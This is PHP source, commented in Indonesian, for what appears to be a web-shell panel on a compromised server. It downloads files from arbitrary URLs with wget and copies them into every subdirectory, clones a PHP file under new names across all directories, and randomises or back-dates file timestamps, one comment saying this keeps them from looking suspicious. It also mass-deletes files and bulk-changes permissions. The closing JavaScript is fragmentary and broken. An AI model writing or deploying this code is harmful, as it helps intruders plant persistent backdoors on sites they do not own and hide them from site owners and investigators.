session_start();

// Variabel untuk menangani pesan
$error = '';
$successMessage = '';
$results = [];
$successPaths = [];
$phpFileList = [];
$deletedFileList = [];
$copiedFilesUrls = [];
$lastSampleTimestamp = '';

// Fungsi untuk menangani pemindaian dan pengaturan izin file
if (isset($_POST['scan'])) {
    $baseDir = $_POST['baseDir'];
    $permissions = $_POST['permissions'];

    if (!is_dir($baseDir)) {
        $error = 'Direktori tidak ditemukan.';
    } else {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDir));
        foreach ($iterator as $file) {
            if ($file->isFile() && substr(sprintf('%o', $file->getPerms()), -4) != $permissions) {
                $results[] = $file->getPathname() . ' - ' . sprintf('%o', $file->getPerms());
            }
        }
        if (empty($results)) {
            $successMessage = 'Semua file sudah sesuai izin.';
        } else {
            $successMessage = 'Pemindaian selesai.';
        }
    }
}

// Fungsi untuk menangani CHMOD rekursif (file dan folder)
if (isset($_POST['chmod'])) {
    $baseDirChmod = $_POST['baseDirChmod'];
    $permissionsChmod = $_POST['permissionsChmod'];

    if (!is_dir($baseDirChmod)) {
        $error = 'Direktori tidak ditemukan.';
    } elseif (!preg_match('/^0?\d{3}$/', $permissionsChmod)) {
        $error = 'Format izin tidak valid. Gunakan format seperti 0644, 0755, 0555, dll.';
    } else {
        // Pastikan format oktal dengan leading zero
        $permOct = (strlen($permissionsChmod) == 3) ? '0' . $permissionsChmod : $permissionsChmod;
        $permInt = octdec($permOct);
        $changedCount = 0;
        $failedCount = 0;
        $changedItems = [];

        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($baseDirChmod, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $item) {
            $currentPerm = substr(sprintf('%o', $item->getPerms()), -4);
            if ($currentPerm != $permOct) {
                if (@chmod($item->getPathname(), $permInt)) {
                    $changedCount++;
                    $changedItems[] = $item->getPathname() . ' - ' . $currentPerm . ' -> ' . $permOct;
                } else {
                    $failedCount++;
                }
            }
        }

        if ($changedCount > 0) {
            $results = $changedItems;
            $successMessage = "CHMOD selesai. $changedCount item berhasil diubah izinnya.";
            if ($failedCount > 0) {
                $successMessage .= " $failedCount item gagal diubah.";
            }
        } else {
            $successMessage = 'Semua file dan folder sudah memiliki izin ' . $permOct . '.';
        }
    }
}

// Fungsi untuk menangani unduhan file menggunakan wget dan menyebarkan ke semua subdirektori
if (isset($_POST['download'])) {
    $url = $_POST['url'];
    $filename = $_POST['filename'] ?: basename($url);
    $destinationDir = $_POST['destinationDir'] ?: __DIR__;

    // Validasi apakah URL valid
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $error = 'URL tidak valid.';
    } elseif (!is_dir($destinationDir)) {
        $error = 'Direktori tujuan tidak ditemukan.';
    } else {
        // Membangun path file tujuan
        $destination = rtrim($destinationDir, '/') . '/' . $filename;

        // Perintah wget untuk mengunduh file ke path yang ditentukan
        $command = "wget -O " . escapeshellarg($destination) . " " . escapeshellarg($url) . " 2>&1";

        // Eksekusi perintah wget
        $output = shell_exec($command);

        // Cek apakah file berhasil diunduh
        if (file_exists($destination) && filesize($destination) > 0) {
            $successMessage = 'Unduhan selesai. File tersimpan di ' . htmlspecialchars($destination);
            $successPaths[] = $destination;

            // Sebarkan file ke semua subdirektori
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($destinationDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($iterator as $dir) {
                if ($dir->isDir()) {
                    $subdirPath = $dir->getPathname();
                    copy($destination, $subdirPath . '/' . $filename);
                    $successPaths[] = $subdirPath . '/' . $filename;
                }
            }
            $successMessage .= ' File berhasil disebarkan ke semua subdirektori.';

            // Proses touch timestamp jika diaktifkan
            if (isset($_POST['enable_touch']) && $_POST['enable_touch'] == '1') {
                $touchYearStart = intval($_POST['touch_year_start']);
                $touchYearEnd = intval($_POST['touch_year_end']);

                // Validasi input
                if ($touchYearStart < 1970 || $touchYearEnd < 1970) {
                    $error = 'Tahun minimal adalah 1970.';
                } elseif ($touchYearStart > $touchYearEnd) {
                    // Jika tahun awal lebih besar dari tahun akhir, swap
                    $temp = $touchYearStart;
                    $touchYearStart = $touchYearEnd;
                    $touchYearEnd = $temp;
                } else {
                    $touchSuccess = true;
                    $touchCount = 0;
                    $lastSampleTimestamp = '';

                    // Hitung batas timestamp yang BENAR
                    // Start: 1 Januari tahun_start 00:00:00
                    $startTimestamp = strtotime($touchYearStart . '-01-01 00:00:00');
                    // End: 31 Desember tahun_end 23:59:59
                    $endTimestamp = strtotime($touchYearEnd . '-12-31 23:59:59');

                    foreach ($successPaths as $path) {
                        if (file_exists($path)) {
                            // Random timestamp dalam range yang benar
                            $randomTimestamp = mt_rand($startTimestamp, $endTimestamp);
                            
                            // Format untuk touch -t
                            $touchFormatted = date('YmdHi.', $randomTimestamp) . sprintf('%02d', date('s', $randomTimestamp));
                            
                            // Eksekusi touch
                            $cmd = "touch -t " . $touchFormatted . " " . escapeshellarg($path);
                            shell_exec($cmd);
                            $touchCount++;
                            
                            // Simpan sample timestamp terakhir untuk ditampilkan
                            if ($touchCount === 1) {
                                $lastSampleTimestamp = date('Y-m-d H:i:s', $randomTimestamp);
                            }
                        }
                    }

                    $successMessage .= " Timestamp diacak otomatis antara {$touchYearStart} - {$touchYearEnd}. {$touchCount} file diubah. Contoh timestamp: {$lastSampleTimestamp}.";
                }
            }
        } else {
            $error = 'Gagal mengunduh file. Periksa apakah URL dapat diakses dan wget terinstall.';
        }
    }
}

// Fungsi untuk menangani pemindaian file PHP dengan tambahan fitur filter dan waktu edit
if (isset($_POST['scan_php'])) {
    $baseDirPhp = $_POST['baseDirPhp'];
    $sortOrder = $_POST['sortOrder'] ?? 'desc';

    if (!is_dir($baseDirPhp)) {
        $error = 'Direktori tidak ditemukan.';
    } else {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirPhp));
        foreach ($iterator as $file) {
            if ($file->isFile() && pathinfo($file->getFilename(), PATHINFO_EXTENSION) === 'php') {
                $filePath = $file->getPathname();
                
                $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
                $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$relativePath";
                
                $phpFileList[] = [
                    'path' => $filePath,
                    'last_modified' => filemtime($filePath),
                    'url' => $url
                ];
            }
        }

        if (empty($phpFileList)) {
            $successMessage = 'Tidak ada file PHP ditemukan.';
        } else {
            usort($phpFileList, function($a, $b) use ($sortOrder) {
                return $sortOrder === 'asc' ? $a['last_modified'] - $b['last_modified'] : $b['last_modified'] - $a['last_modified'];
            });
            $successMessage = 'Pemindaian selesai.';
        }
    }
}

// Fungsi untuk menangani penghapusan file
if (isset($_POST['auto_rm'])) {
    $baseDirRm = $_POST['baseDirRm'];
    $filenameRm = $_POST['filenameRm'];

    if (!is_dir($baseDirRm)) {
        $error = 'Direktori tidak ditemukan.';
    } else {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($baseDirRm));
        foreach ($iterator as $file) {
            if ($file->isFile() && basename($file->getFilename()) === $filenameRm) {
                if (unlink($file->getPathname())) {
                    $deletedFileList[] = $file->getPathname();
                } else {
                    $error = 'Gagal menghapus file: ' . htmlspecialchars($file->getPathname());
                }
            }
        }
        if (empty($deletedFileList)) {
            $successMessage = 'File tidak ditemukan untuk dihapus.';
        } else {
            $successMessage = 'Penghapusan selesai. ' . count($deletedFileList) . ' file berhasil dihapus.';
        }
    }
}

// Handle PHP file copying and renaming
if (isset($_POST['copyRenameSubmit'])) {
    $sourceFilePath = $_POST['sourceFilePath'];
    $destinationDir = $_POST['destinationDir'];
    $newFileNames = array_filter($_POST['newFileName'], function($value) { return !empty(trim($value)); });
    $copiedFilesUrls = [];

    if (!file_exists($sourceFilePath) || !is_file($sourceFilePath)) {
        $error = "Source file does not exist.";
    } elseif (!is_dir($destinationDir)) {
        $error = "Destination directory does not exist.";
    } elseif (empty($newFileNames)) {
        $error = "No new file names provided.";
    } else {
        // Bersihkan trailing slash
        $destinationDir = rtrim($destinationDir, '/\\');
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($destinationDir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $dir) {
            if ($dir->isDir()) {
                foreach ($newFileNames as $newFileName) {
                    $newFileName = basename(trim($newFileName)); // Security: ambil hanya basename
                    $newFilePath = $dir->getPathname() . DIRECTORY_SEPARATOR . $newFileName;
                    if (copy($sourceFilePath, $newFilePath)) {
                        // Touch file baru agar tidak mencurigakan
                        touch($newFilePath, filemtime($sourceFilePath));
                        
                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $newFilePath);
                        $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$relativePath";
                        $copiedFilesUrls[] = $url;
                    } else {
                        $error = "Failed to copy file to $newFilePath.";
                        break 2;
                    }
                }
            }
        }

        if (empty($error)) {
            $successMessage = "Files have been successfully copied and renamed across all directories.";
        }
    }
}

                    }
                });

        function copyToClipboard(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
        }

            const tab = document.getElementById(tabId);

        }
